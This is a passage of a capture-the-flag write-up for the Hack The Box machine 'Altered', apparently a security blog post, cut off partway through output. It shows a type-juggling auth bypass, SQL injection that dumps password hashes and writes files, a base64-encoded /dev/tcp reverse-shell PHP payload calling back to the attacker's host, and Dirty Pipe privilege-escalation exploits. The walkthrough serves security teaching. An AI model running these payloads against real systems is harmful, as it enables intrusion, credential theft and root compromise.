class="s2">"X-Forwarded-For: FUZ2Z"</span> <span class="nt">-m</span> zip
+<span class="go">********************************************************
+* Wfuzz 2.4.5 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.11.159/api/resettoken
+Total requests: 10000
+
+===================================================================
+ID           Response   Lines    Word     Chars       Payload
+===================================================================
+
+000001478:   200        138 L    303 W    5366 Ch     "1477 - 10.10.5.222"
+
+Total time: 206.5825
+Processed Requests: 10000
+Filtered Requests: 9999
+Requests/sec.: 48.40680
+</span></code></pre></div></div>
+<p>About a minute later I have a pin that returns a different length.</p>
+<h4 id="change-password">Change Password</h4>
+<p>When I enter that pin into <code class="language-plaintext highlighter-rouge">/reset</code>, it shows a new form:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220324130214509.webp" type="image/webp"/>
+<img alt="image-20220324130214509" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220324130214509.png"/>
+</picture>
+<p>I’ll change it to something I know, and then log in, and it works.</p>
+<h3 id="bypass-secret-check">Bypass Secret Check</h3>
+<h4 id="authenticated-enumeration">Authenticated Enumeration</h4>
+<p>Once logged in, there’s a simple table with a list of winners, their name, country, and a link to a profile:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220324134608575.webp" type="image/webp"/>
+<img alt="image-20220324134608575" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220324134608575.png"/>
+</picture>
+<p>Hovering over each link just shows it targeting the page:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220324135221436.webp" type="image/webp"/>
+<img alt="image-20220324135221436" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220324135221436.png"/>
+</picture>
+<p>Clicking on one does pop a new section with some text:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220324135324640.webp" type="image/webp"/>
+<img alt="image-20220324135324640" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220324135324640.png"/>
+</picture>
+<p>Looking in the Firefox dev tools, there is Javascript that handles the the “on-click” action, each <code class="language-plaintext highlighter-rouge">&lt;a&gt;</code> tag is hardcoded with an <code class="language-plaintext highlighter-rouge">onclick</code> that handles the click with JavaScript. For example:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"#"</span> <span class="na">id=</span><span class="s">"GetBio"</span> <span class="na">onclick=</span><span class="s">"getBio( '1', '89cb389c73f667c5511ce169033089cb' );"</span><span class="nt">&gt;</span>View<span class="nt">&lt;/a&gt;</span>
+</code></pre></div></div>
+<p>Each link is hardcoded with a different second parameter.</p>
+<p>The <code class="language-plaintext highlighter-rouge">getBio</code> script is inline in the page at the top:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kd">function</span> <span class="nf">getBio</span><span class="p">(</span><span class="nx">id</span><span class="p">,</span><span class="nx">secret</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">$</span><span class="p">.</span><span class="nf">ajax</span><span class="p">({</span>
+            <span class="na">type</span><span class="p">:</span> <span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span>
+            <span class="na">url</span><span class="p">:</span> <span class="dl">'</span><span class="s1">api/getprofile</span><span class="dl">'</span><span class="p">,</span>
+            <span class="na">data</span><span class="p">:</span> <span class="p">{</span>
+                <span class="na">id</span><span class="p">:</span> <span class="nx">id</span><span class="p">,</span>
+                <span class="na">secret</span><span class="p">:</span> <span class="nx">secret</span>
+            <span class="p">},</span>
+            <span class="na">success</span><span class="p">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span>
+            <span class="p">{</span>
+                <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">alert</span><span class="dl">'</span><span class="p">).</span><span class="nx">style</span><span class="p">.</span><span class="nx">visibility</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">visible</span><span class="dl">'</span><span class="p">;</span>
+                <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">alert</span><span class="dl">'</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">data</span><span class="p">;</span>
+            <span class="p">}</span>
+
+        <span class="p">});</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+<p>It makes an HTTP request over AJAX to <code class="language-plaintext highlighter-rouge">/api/getprofile</code> passing the id and secret.</p>
+<h4 id="enumerating-secrets">Enumerating Secrets</h4>
+<p>Looking in Burp confirms that each link sends a different id and secret to the server:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220324140722475.webp" type="image/webp"/>
+<img alt="image-20220324140722475" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220324140722475.png"/>
+</picture>
+<p>The <code class="language-plaintext highlighter-rouge">secret</code> seems to be the same for a given <code class="language-plaintext highlighter-rouge">id</code>. The secret looks like an MD5 hash, but some quick testing in a console shows it isn’t just a hash of the id. Most likely they are appending or prepending a secret value to the id and hashing that.</p>
+<p>If I send one of the requests to Burp Repeater and try modifying the secret, it returns an error message:</p>
+<p><a href="https://0xdfimages.gitlab.io/img/image-20220324140954627.png"><img alt="image-20220324140954627" src="https://0xdfimages.gitlab.io/img/image-20220324140954627.png"/><em>Click for full size image</em></a></p>
+<h4 id="bypassing-secret-with-type-juggling">Bypassing Secret With Type Juggling</h4>
+<p>In <a href="/2022/03/15/htb-ransom.html#bypass-login">Ransom</a>, a previous UHC box, there was a Laravel application where the authentication could be bypassed using type juggling. I can try the same attack here. If I change the above request to a POST, the site returns 405 Method Not Allowed. I’ll try the same trick, sending JSON data in the body of a GET request. With the legit secret, the response comes back:</p>
+<p><a href="https://0xdfimages.gitlab.io/img/image-20220324141426943.png"><img alt="image-20220324141426943" src="https://0xdfimages.gitlab.io/img/image-20220324141426943.png"/><em>Click for full size image</em></a></p>
+<p>If I think about the code on the server, I expect it to take the id, prepend or append some extra data, and take a hash, and then compare that hash to <code class="language-plaintext highlighter-rouge">secret</code>. If that comparison is done with <code class="language-plaintext highlighter-rouge">==</code> and not <code class="language-plaintext highlighter-rouge">===</code>, type juggling would bypass the check. I’ll try changing <code class="language-plaintext highlighter-rouge">secret</code> to <code class="language-plaintext highlighter-rouge">true</code>, and it works:</p>
+<p><a href="https://0xdfimages.gitlab.io/img/image-20220324141559087.png"><img alt="image-20220324141559087" src="https://0xdfimages.gitlab.io/img/image-20220324141559087.png"/><em>Click for full size image</em></a></p>
+<p>This query also works with the <code class="language-plaintext highlighter-rouge">id</code> as a string instead of an int:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220324142618277.webp" type="image/webp"/>
+<img alt="image-20220324142618277" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220324142618277.png"/>
+</picture>
+<p>This is important because if I send in something like a SQL injection payload, it can’t go in an integer field, but it fits fine into a string.</p>
+<h3 id="sql-injection">SQL Injection</h3>
+<h4 id="identify">Identify</h4>
+<p>To test for SQL injection, I’ll start with a simply <code class="language-plaintext highlighter-rouge">"1'"</code> to see if it crashes. It does:</p>
+<p><a href="https://0xdfimages.gitlab.io/img/image-20220324142916229.png"><img alt="image-20220324142916229" src="https://0xdfimages.gitlab.io/img/image-20220324142916229.png"/><em>Click for full size image</em></a></p>
+<p>That’s a good indication that I’m injecting into a SQL statement.</p>
+<p>If I send <code class="language-plaintext highlighter-rouge">"12"</code> as a payload, it returns 500 as well. Presumably that’s because there is no <code class="language-plaintext highlighter-rouge">id</code> in the DB, and the site isn’t handling that well (assuming that since no one has the <code class="language-plaintext highlighter-rouge">secret</code> for 12, it can’t be requested).</p>
+<p>If I change that to <code class="language-plaintext highlighter-rouge">"12 or 1=1;-- -"</code>, then it works again:</p>
+<p><a href="https://0xdfimages.gitlab.io/img/image-20220324143136167.png"><img alt="image-20220324143136167" src="https://0xdfimages.gitlab.io/img/image-20220324143136167.png"/><em>Click for full size image</em></a></p>
+<p>What this tells me is that the query probably looks like:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">profile</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">id</span> <span class="o">=</span> <span class="p">[</span><span class="k">input</span><span class="p">];</span>
+</code></pre></div></div>
+<p>And then later it’s using the first result.</p>
+<h4 id="enumerate-db">Enumerate DB</h4>
+<p>Interestingly, <code class="language-plaintext highlighter-rouge">sqlmap</code> doesn’t seem to work with a GET request with parameters in the body. If anyone does get this to work, I’d love to see it! Still, it’s not hard to do manually. I’ll start by getting a feel for how many columns there are, and which ones are displayed back by adding <code class="language-plaintext highlighter-rouge">union select 1</code>, then <code class="language-plaintext highlighter-rouge">union select 1,2</code>, then <code class="language-plaintext highlighter-rouge">union select 1,2,3</code>, etc. Only when my added <code class="language-plaintext highlighter-rouge">select</code> statement has the same number of columns as the query it’s injected into will it return. It looks like there are three columns:</p>
+<p><a href="https://0xdfimages.gitlab.io/img/image-20220324173430446.png"><img alt="image-20220324173430446" src="https://0xdfimages.gitlab.io/img/image-20220324173430446.png"/><em>Click for full size image</em></a></p>
+<p>I can replace <code class="language-plaintext highlighter-rouge">3</code> with things I want to query. I’ll start by getting a list of the databases:</p>
+<p><a href="https://0xdfimages.gitlab.io/img/image-20220324173515450.png"><img alt="image-20220324173515450" src="https://0xdfimages.gitlab.io/img/image-20220324173515450.png"/><em>Click for full size image</em></a></p>
+<p>Of all of those, only <code class="language-plaintext highlighter-rouge">uhc</code> is custom. I’ll focus there. I’ll list the tables and columns with:</p>
+<div class="language-json wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"0 union select 1,2,group_concat(concat('</span><span class="se">\n</span><span class="s2">', table_name, ':', column_name)) from information_schema.columns where table_schema = 'uhc';-- -"</span><span class="p">,</span><span class="w"> </span><span class="nl">"secret"</span><span class="p">:</span><span class="kc">true</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<p>This returns a fair number of columns:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>failed_jobs:id,
+failed_jobs:uuid,
+failed_jobs:connection,
+failed_jobs:queue,
+failed_jobs:payload,
+failed_jobs:exception,
+failed_jobs:failed_at,
+migrations:id,
+migrations:migration,
+migrations:batch,
+password_resets:email,
+password_resets:token,
+password_resets:created_at,
+personal_access_tokens:id,
+personal_access_tokens:tokenable_type,
+personal_access_tokens:tokenable_id,
+personal_access_tokens:name,
+personal_access_tokens:token,
+personal_access_tokens:abilities,
+personal_access_tokens:last_used_at,
+personal_access_tokens:created_at,
+personal_access_tokens:updated_at,
+tasks:id,
+tasks:title,
+tasks:description,
+tasks:progress,
+tasks:status,
+tasks:owner,
+tasks:created_at,
+tasks:updated_at,
+users:id,
+users:name,
+users:email,
+users:country,
+users:bio,
+users:email_verified_at,
+users:password,
+users:remember_token,
+users:created_at,
+users:updated_at
+</code></pre></div></div>
+<p>I can dump the users and passwords with:</p>
+<div class="language-json wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"0 union select 1,2,group_concat(concat('</span><span class="se">\n</span><span class="s2">', name, ':', password)) from users;-- -"</span><span class="p">,</span><span class="w"> </span><span class="nl">"secret"</span><span class="p">:</span><span class="kc">true</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<p>It returns:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>big0us:$2y$10$Cuf2DxXbrTQSKYWL6n3Kbeqq6TaZ3KCgISO8FdGpsNZ5aEa6lSx6G,
+celesian:$2y$10$8ewqN3lE9iazbo8sFiwUleeNIbOpAMRcaMzeiXJ50wlItN2Kd5pI6,
+luska:$2y$10$KdZCbzxXRsBOBHI.91XIz.O.lQQ3TqeY8uonzAumoAv6v9JVQv3g.,
+tinyb0y:$2y$10$X501zxcWLKXf.OteOaPILuhMBIalFjid5bBjBkrst/cynKL/DLfiS,
+o-tafe:$2y$10$XIrsc.ma/p0qhvWm9.sqyOnA5184ICWNverXQVLQJD30nCw7.PyxW,
+watchdog:$2y$10$RTbD7i5I53rofpAfr83YcOK2XsTglO01jVHZajEOSH1tGXiU8nzEq,
+mydonut:$2y$10$7DFlqs/eXGm0JPVebpPheuEx3gXPhTnRmN1Ia5wutECZg1El7cVJK,
+bee:$2y$10$Furn1Q0Oy8IbeCslv7.Oy.psgPoCH2ds3FZfJeQlCdxJ0WVhLKmzm
+</code></pre></div></div>
+<p>Still, this isn’t useful. I’ve already seen that any player can change any of these, so it seems unlikely that a real password that’ll be useful to me is in there.</p>
+<p>I could also mess with password reset tokens, but it doesn’t buy me much I don’t already have.</p>
+<h4 id="file-read">File Read</h4>
+<p>Another thing I can do with a SQL injection is try to read files. To make sure I have the syntax correct, I’ll start with <code class="language-plaintext highlighter-rouge">/etc/passwd</code> using <code class="language-plaintext highlighter-rouge">load_file</code>:</p>
+<p><a href="https://0xdfimages.gitlab.io/img/image-20220324192434003.png"><img alt="image-20220324192434003" src="https://0xdfimages.gitlab.io/img/image-20220324192434003.png"/><em>Click for full size image</em></a></p>
+<p>To check out where the website is hosted, I’ll look for a config file for NGINX. The location for these is in <code class="language-plaintext highlighter-rouge">/etc/nginx/sites-enabled/</code>. Every file in this directory is parsed as a site config, so I’ll have to get lucky and hope Altered used the default name, <code class="language-plaintext highlighter-rouge">default</code>. It’s there:</p>
+<p><a href="https://0xdfimages.gitlab.io/img/image-20220324192622717.png"><img alt="image-20220324192622717" src="https://0xdfimages.gitlab.io/img/image-20220324192622717.png"/><em>Click for full size image</em></a></p>
+<p class="wrap">It’s a pretty standard config. I’ll note the location I’ve boxed in blue. The web root is in <code class="language-plaintext highlighter-rouge">/srv/altered/public</code> (which is actually the location suggested in the <a href="https://laravel.com/docs/9.x/deployment">Laravel docs</a>).</p>
+<p>I can read the source, like <code class="language-plaintext highlighter-rouge">index.php</code>:</p>
+<p><a href="https://0xdfimages.gitlab.io/img/image-20220324215821565.png"><img alt="image-20220324215821565" src="https://0xdfimages.gitlab.io/img/image-20220324215821565.png"/><em>Click for full size image</em></a></p>
+<p>But there’s not much that’ll help me.</p>
+<h4 id="file-write">File Write</h4>
+<p>Given that I can read, I can also try to write a file. Sending this payload will result in a 500 error from the server:</p>
+<div class="language-json wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"0 union select 1,2,'test' into outfile '/srv/altered/public/0xdf';-- -"</span><span class="p">,</span><span class="w"> </span><span class="nl">"secret"</span><span class="p">:</span><span class="kc">true</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<p>Still, after doing so:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl http://10.10.11.159/0xdf
+<span class="go">1       2       test
+</span></code></pre></div></div>
+<p>I can also write PHP files that will be executed. For example, sending:</p>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"0 union select 1,2,'&lt;?php phpinfo(); ?&gt;' into outfile '/srv/altered/public/0xdf-info.php';-- -"</span><span class="p">,</span><span class="w"> </span><span class="nl">"secret"</span><span class="p">:</span><span class="kc">true</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<p>Generates:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220324220350820.webp" type="image/webp"/>
+<img alt="image-20220324220350820" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220324220350820.png"/>
+</picture>
+<p>That’s the output of the <code class="language-plaintext highlighter-rouge">phpinfo()</code> function!</p>
+<h3 id="shell">Shell</h3>
+<p>To get a shell, I’ll write a simple PHP script that creates a reverse shell. To avoid nested quote marks, I’ll create a reverse shell and base64-encode it:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1'"</span> | <span class="nb">base64</span> 
+<span class="go">YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxJwo=
+</span></code></pre></div></div>
+<p>I’ll write the following file:</p>
+<div class="language-json wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"0 union select 1,2,'&lt;?php system(base64_decode(</span><span class="se">\"</span><span class="s2">YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxJwo=</span><span class="se">\"</span><span class="s2">)); ?&gt;' into outfile '/srv/altered/public/shell.php';-- -"</span><span class="p">,</span><span class="w"> </span><span class="nl">"secret"</span><span class="p">:</span><span class="kc">true</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<p>Then on visiting <code class="language-plaintext highlighter-rouge">/shell.php</code>, there’s a connection at <code class="language-plaintext highlighter-rouge">nc</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">Listening on 0.0.0.0 443
+Connection received on 10.10.11.159 38142
+bash: cannot set terminal process group (844): Inappropriate ioctl for device
+bash: no job control in this shell
+</span><span class="gp">www-data@altered:/srv/altered/public$</span><span class="w">
+</span></code></pre></div></div>
+<p>Upgrade my shell with <code class="language-plaintext highlighter-rouge">script</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@altered:/srv/altered/public$</span><span class="w"> </span>script /dev/null <span class="nt">-c</span> bash
+<span class="go">script /dev/null -c bash
+Script started, file is /dev/null
+</span><span class="gp">www-data@altered:/srv/altered/public$</span><span class="w"> </span>^Z
+<span class="go">[1]+  Stopped                 nc -lnvp 443
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
+<span class="go">nc -lnvp 443
+            reset
+reset: unknown terminal type unknown
+Terminal type? screen
+</span><span class="gp">www-data@altered:/srv/altered/public$</span><span class="w">
+</span></code></pre></div></div>
+<p>And grab <code class="language-plaintext highlighter-rouge">user.txt</code> from the only user home directory on the box:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@altered:/home/htb$</span><span class="w"> </span><span class="nb">cat </span>user.txt
+<span class="go">5e82b60a************************
+</span></code></pre></div></div>
+<h2 id="shell-as-root">Shell as root</h2>
+<h3 id="enumeration">Enumeration</h3>
+<p><code class="language-plaintext highlighter-rouge">uname -a</code> shows that the kernel is from January, about 2.5 months ago:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@altered:/srv/altered/public$</span><span class="w"> </span><span class="nb">uname</span> <span class="nt">-a</span>
+<span class="go">Linux altered 5.16.0-051600-generic #202201092355 SMP PREEMPT Mon Jan 10 00:21:11 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
+</span></code></pre></div></div>
+<p>There was a major kernel vulnerability, CVE-2022-0847 or <a href="https://dirtypipe.cm4all.com/">Dirty Pipe</a>, which was patched in March, for kernels 5.16.11, 5.15.25, and 5.10.102. This box is running 5.16.0, and therefore should be vulnerable.</p>
+<h3 id="dirty-pipe-background">Dirty Pipe Background</h3>
+<p>Dirty Pipe (CVE-2022-0847) became public in early March 2022, with a detailed <a href="https://dirtypipe.cm4all.com/">blog post</a> from Max Kellermann. The post has great detail about how it works.</p>
+<p>The exploit takes advantage of how the system will cache data before it is written to disk, modifying the data in that cache so that the changes get written to disk. This allows for an attacker to modify files even without write permissions with some constraints:</p>
+<ul>
+<li>They must have read access to the file.</li>
+<li>They can’t modify the first byte of the file.</li>
+<li>They can’t change the size of the file.</li>
+</ul>
+<p>Within these constraints, the most common way to exploit this is to modify the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file (something I’ve shown <a href="/tags.html#passwd">many times before</a>). The difference is that typically I’ve added a second root user with a known hash. In this case, the exploit will typically just make a backup copy of the file, edit in place the root user, get a shell as that user, and then put the original file back.</p>
+<p>The other less common way to exploit this is to overwrite a SUID binary with a new ELF that gets a shell.</p>
+<p>There are some other ways of abusing arbitrary write that don’t really work in this case. I could write to <code class="language-plaintext highlighter-rouge">/etc/crontab</code> (or other <code class="language-plaintext highlighter-rouge">cron</code> files), but because of how the attack works, the file system won’t notify <code class="language-plaintext highlighter-rouge">cron</code> to reload them. If the changes last through a reboot or other <code class="language-plaintext highlighter-rouge">cron</code> modification, they could work. Another common technique with arbitrary write is to change the <code class="language-plaintext highlighter-rouge">sudoers</code> file, allowing the current user to run commands as root. That won’t work here because typically that file can’t be read by a non-root user.</p>
+<h3 id="exploit-etcpasswd">Exploit /etc/passwd</h3>
+<h4 id="success-but-failure">Success, but Failure</h4>
+<p><a href="https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits">This repo</a> has two Dirty Pipe proof of concept exploits. The first does what most Dirty Pipe exploits do, modifying <code class="language-plaintext highlighter-rouge">/etc/password</code>. <code class="language-plaintext highlighter-rouge">gcc</code> and <code class="language-plaintext highlighter-rouge">cc</code> aren’t on Altered, so I’ll just download the source and compile it on my own workstation:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>wget https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-1.c
+<span class="go">...[snip]...
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>gcc <span class="nt">-o</span> exploit-1 exploit-1.c
+</code></pre></div></div>
+<p>I’ll run a Python webserver in that directory, and fetch the exploit from Altered:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@altered:/dev/shm$</span><span class="w"> </span>wget 10.10.14.6/exploit-1
+<span class="go">...[snip]...
+</span><span class="gp">www-data@altered:/dev/shm$</span><span class="w"> </span><span class="nb">chmod</span> +x exploit-1
+</code></pre></div></div>
+<p>On running it, I get an unexpected result:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@altered:</span>/dev/shm<span class="nv">$ </span>./exploit-1 
+<span class="go">Backing up /etc/passwd to /tmp/passwd.bak ...
+Setting root password to "piped"...
+--- Welcome to PAM-Wordle! ---
+
+A five character [a-z] word has been selected.
+You have 6 attempts to guess the word.
+
+After each guess you will receive a hint which indicates:
+? - what letters are wrong.
+* - what letters are in the wrong spot.
+[a-z] - what letters are correct.
+
+--- Attempt 1 of 6 ---
+</span><span class="gp">Word:</span><span class="w"> </span>Invalid guess: unknown word.
+<span class="gp">Word:</span><span class="w">
+</span></code></pre></div></div>
+<p>The exploit changed the password to “piped”, and then is trying to run <code class="language-plaintext highlighter-rouge">su</code>:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="s">"-c"</span><span class="p">,</span> <span class="s">"(echo piped; cat) | su - -c </span><span class="se">\"</span><span class="s">"</span>
+                <span class="s">"echo </span><span class="se">\\\"</span><span class="s">Restoring /etc/passwd from /tmp/passwd.bak...</span><span class="se">\\\"</span><span class="s">;"</span>
+                <span class="s">"cp /tmp/passwd.bak /etc/passwd;"</span>
+                <span class="s">"echo </span><span class="se">\\\"</span><span class="s">Done! Popping shell... (run commands now)</span><span class="se">\\\"</span><span class="s">;"</span>
+                <span class="s">"/bin/sh;"</span>
+            <span class="s">"</span><span class="se">\"</span><span class="s"> root"</span><span class="p">};</span>
+        <span class="n">execv</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="n">argv</span><span class="p">);</span>
+</code></pre></div></div>
+<h4 id="pam-wordle">PAM-Wordle</h4>
+<p>If I Ctrl-c from this and just run <code class="language-plaintext highlighter-rouge">su</code>, I see the same thing:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@altered:</span>/dev/shm<span class="nv">$ </span>su -
+<span class="go">--- Welcome to PAM-Wordle! ---
+
+A five character [a-z] word has been selected.
+You have 6 attempts to guess the word.
+
+After each guess you will receive a hint which indicates:
+? - what letters are wrong.
+* - what letters are in the wrong spot.
+[a-z] - what letters are correct.
+
+--- Attempt 1 of 6 ---
+</span><span class="gp">Word:</span><span class="w">
+</span></code></pre></div></div>
+<p>The only difference is that the exploit tried to send “piped” which returned that it wasn’t a word.</p>
+<p>It seems this box has <a href="https://github.com/lukem1/pam-wordle">PAM-Wordle</a> installed. PAM stands for Pluggable Authentication Module. It seems this was added in on this box. Wordle is a word game that’s very popular on the internet now (check out <a href="https://www.youtube.com/watch?v=or1AKX5kTZA">my video on hacking Wordle</a>). This kind of thing isn’t very realistic, and I wouldn’t expect to see it on a Weekly HTB machine, but it’s kind of funny for a live event like UHC.</p>
+<p>I’ll quickly find that it’s using a non-standard dictionary, as all the words I guess aren’t in it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">--- Attempt 1 of 6 ---
+</span><span class="gp">Word:</span><span class="w"> </span>stare
+<span class="go">Invalid guess: unknown word.
+</span><span class="gp">Word:</span><span class="w"> </span>crane
+<span class="go">Invalid guess: unknown word.
+</span><span class="gp">Word:</span><span class="w"> </span>adieu
+<span class="go">Invalid guess: unknown word.
+</span></code></pre></div></div>
+<p>It seems broken, which is really just a suggestion to find another path. Still, it is possible. It seems like it takes hacking / computer words:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">Word:</span><span class="w"> </span>hacks
+<span class="go">Hint-&gt;???*?
+</span></code></pre></div></div>
+<p>That means there’s an “h” and a “s” in the word, but neither is in the right place.</p>
+<p>After playing a few times and getting a feel for the wordlist, I was able to win:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">--- Attempt 1 of 6 ---
+</span><span class="gp">Word:</span><span class="w"> </span>hacks
+<span class="go">Hint-&gt;???*?
+--- Attempt 2 of 6 ---
+</span><span class="gp">Word:</span><span class="w"> </span>shell
+<span class="go">Hint-&gt;?????
+--- Attempt 3 of 6 ---
+</span><span class="gp">Word:</span><span class="w"> </span><span class="nb">mkdir</span>
+<span class="go">Hint-&gt;?*??*
+--- Attempt 4 of 6 ---
+</span><span class="gp">Word:</span><span class="w"> </span>ngrok 
+<span class="go">Correct!
+</span><span class="gp">Password:</span><span class="w">
+</span></code></pre></div></div>
+<p>I’ll enter the password from the exploit, “piped”, and get a root shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">--- Attempt 4 of 6 ---
+</span><span class="gp">Word:</span><span class="w"> </span>ngrok 
+<span class="go">Correct!
+</span><span class="gp">Password:</span><span class="w">
+</span><span class="gp">#</span><span class="w"> </span>bash
+<span class="gp">root@altered:</span>~#
+</code></pre></div></div>
+<p>And get <code class="language-plaintext highlighter-rouge">root.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@altered:~#</span><span class="w"> </span><span class="nb">cat </span>root.txt
+<span class="go">0741c579************************
+</span></code></pre></div></div>
+<h3 id="exploit-suid">Exploit SUID</h3>
+<p>The second POC in that repo exploits a SUID binary. I’ll download it and compile it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>wget https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-2.c
+<span class="go">...[snip]...
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>gcc <span class="nt">-o</span> exploit-2 exploit-2.c 
+</code></pre></div></div>
+<p>Using the Python webserver I’ll upload it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@altered:/dev/shm$</span><span class="w"> </span>wget 10.10.14.6/exploit-2
+<span class="go">...[snip]...
+</span><span class="gp">www-data@altered:/dev/shm$</span><span class="w"> </span><span class="nb">chmod</span> +x exploit-2 
+</code></pre></div></div>
+<p>This one requires that I give it a SUID binary. <code class="language-plaintext highlighter-rouge">pkexec</code> seems like a good one:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@altered:/dev/shm$</span><span class="w"> </span>which pkexec
+<span class="go">/usr/bin/pkexec
+</span><span class="gp">www-data@altered:/dev/shm$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /usr/bin/pkexec 
+<span class="go">-rwsr-xr-x 1 root root 31032 Feb 21 12:58 /usr/bin/pkexec
+</span></code></pre></div></div>
+<p>Running it gives a root shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@altered:/dev/shm$</span><span class="w"> </span>./exploit-2 /usr/bin/pkexec     
+<span class="go">[+] hijacking suid binary..
